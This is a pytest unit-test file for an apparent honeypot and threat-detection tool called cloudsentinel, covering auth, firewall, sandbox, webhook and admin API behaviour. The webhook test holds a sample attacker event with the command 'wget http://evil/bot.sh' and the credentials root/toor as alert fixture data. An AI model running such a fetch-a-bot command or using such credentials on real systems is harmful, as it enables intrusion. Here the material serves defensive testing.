"""Fourth batch of focused unit tests."""

from __future__ import annotations

import asyncio
import json
import time
from types import SimpleNamespace

import pytest
from pydantic import SecretStr

from cloudsentinel import cli
from cloudsentinel._secrets import InfisicalProvider, VaultProvider
from cloudsentinel.auth import AuthConfig, PyJWTAuth, get_auth
from cloudsentinel.config import load_settings
from cloudsentinel.firewall import IPTablesBackend
from cloudsentinel.geoip import _enrich_fallback, _enrich_http
from cloudsentinel.pipeline import EventPipeline
from cloudsentinel.sandbox import FirecrackerSandbox, GVisorSandbox, create_sandbox
from cloudsentinel.shell import HoneyPotInteractiveProtocol
from cloudsentinel.stream import LiveStream
from cloudsentinel.stress_test import StressTest
from cloudsentinel.threat_reporter import generate_report
from cloudsentinel.vfs import VirtualFileSystem
from cloudsentinel.webhook import WebhookConfig, WebhookNotifier


def test_pyjwt_round_trip() -> None:
    auth = PyJWTAuth(AuthConfig(secret="unit-test-secret", enabled=True))
    token = auth.create_token("admin")
    assert token is not None
    payload = auth.validate_token(token)
    assert payload is not None
    assert payload["sub"] == "admin"
    expired = auth.create_token("admin")
    assert auth.validate_token(expired) is not None
    refresh = auth.create_refresh_token("admin")
    assert refresh is not None


@pytest.mark.asyncio
async def test_offline_secret_providers(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("INFISICAL_CLIENT_ID", raising=False)
    monkeypatch.delenv("INFISICAL_CLIENT_SECRET", raising=False)
    monkeypatch.delenv("VAULT_ADDR", raising=False)
    monkeypatch.delenv("VAULT_TOKEN", raising=False)
    monkeypatch.setenv("CLOUDSENTINEL_OFFLINE_SECRET", "value")
    infisical = InfisicalProvider()
    assert await infisical.get("CLOUDSENTINEL_OFFLINE_SECRET") == "value"
    assert await infisical.get_all("CLOUDSENTINEL_OFFLINE_") == {
        "CLOUDSENTINEL_OFFLINE_SECRET": "value"
    }
    await infisical.close()
    vault = VaultProvider()
    assert await vault.get("CLOUDSENTINEL_OFFLINE_SECRET") == "value"
    assert await vault.get_all("CLOUDSENTINEL_OFFLINE_") == {
        "CLOUDSENTINEL_OFFLINE_SECRET": "value"
    }
    await vault.close()


def test_geoip_fallbacks() -> None:
    assert _enrich_fallback("10.0.0.1")["country_code"] == "PV"
    assert _enrich_fallback("8.8.8.8", "lookup_failed")["country_code"] == "XX"
    assert _enrich_http("10.0.0.1") is None


@pytest.mark.asyncio
async def test_firewall_failure_paths(monkeypatch: pytest.MonkeyPatch) -> None:
    class FakeProc:
        returncode = 1

        async def communicate(self) -> tuple[bytes, bytes]:
            return b"", b"boom"

    async def fake_exec(*_args: str, **_kwargs: object) -> FakeProc:
        return FakeProc()

    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
    backend = IPTablesBackend(path="iptables")
    ok, error = await backend.block("8.8.8.8")
    assert ok is False
    assert "boom" in error
    assert await backend.is_blocked("8.8.8.8") is False


@pytest.mark.asyncio
async def test_sandbox_fallbacks(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("cloudsentinel.sandbox.shutil.which", lambda _: None)
    gvisor = GVisorSandbox()
    code, message = await gvisor.execute("whoami", "~")
    assert code == 1
    assert "gVisor" in message
    firecracker = FirecrackerSandbox()
    code, message = await firecracker.execute("whoami", "~")
    assert code == 1
    assert "Firecracker" in message
    assert isinstance(create_sandbox("firecracker"), FirecrackerSandbox)


@pytest.mark.asyncio
async def test_webhook_platform_senders() -> None:
    config = WebhookConfig(
        enabled=True,
        slack_url="http://slack.invalid",
        discord_url="http://discord.invalid",
        telegram_bot_token="token",
        telegram_chat_id="chat",
    )
    notifier = WebhookNotifier(config)

    class FakeResponse:
        status_code = 200

        def raise_for_status(self) -> None:
            return None

    class FakeClient:
        async def post(self, *_args: object, **_kwargs: object) -> FakeResponse:
            return FakeResponse()

        async def aclose(self) -> None:
            return None

    notifier._client = FakeClient()  # type: ignore[assignment]
    event = {
        "src_ip": "1.2.3.4",
        "cloudsentinel_risk_score": 90,
        "cloudsentinel_mitre_techniques": ["T1105"],
        "cloudsentinel_soar_action": "iptables_block",
        "username": "root",
        "password": "toor",
        "input": "wget http://evil/bot.sh",
        "eventid": "cloudsentinel.command.input",
    }
    try:
        assert await notifier._send_slack(event) is True
        assert await notifier._send_discord(event) is True
        assert await notifier._send_telegram(event) is True
    finally:
        await notifier.close()


@pytest.mark.asyncio
async def test_threat_report_without_commands() -> None:
    report = await generate_report("session-empty", redis_url="")
    assert report.summary == "No command telemetry captured for this session yet."
    assert report.model_used == "none"
    assert report.confidence == 0.0


def test_stress_report_and_snapshot() -> None:
    test = StressTest("127.0.0.1", 2222, 4)
    test.connected = 3
    test.failed = 1
    test.timings = [0.1, 0.2, 0.3]
    report = test._report(1.0)
    assert report["total_attempted"] == 4
    assert report["successful"] == 3
    assert report["failed"] == 1
    assert report["avg_connect_time_ms"] > 0
    assert report["resource_snapshot"]["pid"] > 0


def test_shell_dispatch_and_close() -> None:
    class FakeTransport:
        def __init__(self) -> None:
            self.output = b""
            self.closed = False

        def write(self, data: bytes) -> None:
            self.output += data

        def close(self) -> None:
            self.closed = True

    transport = FakeTransport()
    protocol = HoneyPotInteractiveProtocol(
        transport=transport,
        vfs=VirtualFileSystem.build_default(),
        username="root",
        hostname="unit-host",
        ip="8.8.8.8",
    )
    protocol._handle_data(b"whoami\r\n")
    assert b"root" in transport.output
    protocol._handle_data(b"whoami | cat\r\n")
    assert transport.output.count(b"root") >= 2
    fresh = HoneyPotInteractiveProtocol(
        transport=FakeTransport(),
        vfs=VirtualFileSystem.build_default(),
        username="root",
        hostname="unit-host",
        ip="8.8.8.8",
    )
    fresh._handle_data(b"\x04")
    assert fresh._closed is True


def test_stream_stop() -> None:
    class FakeRunner:
        def __init__(self) -> None:
            self.cleaned = False

        async def cleanup(self) -> None:
            self.cleaned = True

    stream = LiveStream()
    runner = FakeRunner()
    stream._runner = runner
    stream._started = True
    asyncio.run(stream.stop())
    assert runner.cleaned is True
    assert stream._started is False


def test_cli_header_and_status(monkeypatch: pytest.MonkeyPatch) -> None:
    pytest.importorskip("typer")
    if not cli._HAS_CLI:
        pytest.skip("typer/rich not installed")

    class FakeResponse:
        def read(self) -> bytes:
            return json.dumps(
                {
                    "ok": True,
                    "hostname": "unit-host",
                    "redis_connected": True,
                    "pending_events": 0,
                }
            ).encode()

    monkeypatch.setattr("urllib.request.urlopen", lambda *_args, **_kwargs: FakeResponse())
    cli._header()
    cli.status(admin_url="http://127.0.0.1:8080")
    cli.status(admin_url="http://127.0.0.1:1")


def test_admin_readiness_llm_and_login(monkeypatch: pytest.MonkeyPatch) -> None:
    from fastapi.testclient import TestClient

    from cloudsentinel.admin_api import create_admin_app

    monkeypatch.delenv("CLOUDSENTINEL_AUTH_ENABLED", raising=False)
    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )
    settings.admin.token = SecretStr("unit-token")
    settings.clickhouse.enabled = False
    pipeline = EventPipeline(settings.redis)
    client = TestClient(create_admin_app(settings, pipeline))
    headers = {"Authorization": "Bearer unit-token"}
    readiness = client.get("/readiness", headers=headers)
    assert readiness.status_code == 200
    assert readiness.json()["clickhouse_ok"] is None
    llm = client.get("/llm/status", headers=headers)
    assert llm.status_code == 200
    assert "features" in llm.json()
    login = client.post("/auth/login", json={"username": "admin", "password": ""})
    assert login.status_code == 200
    assert "token" in login.json()
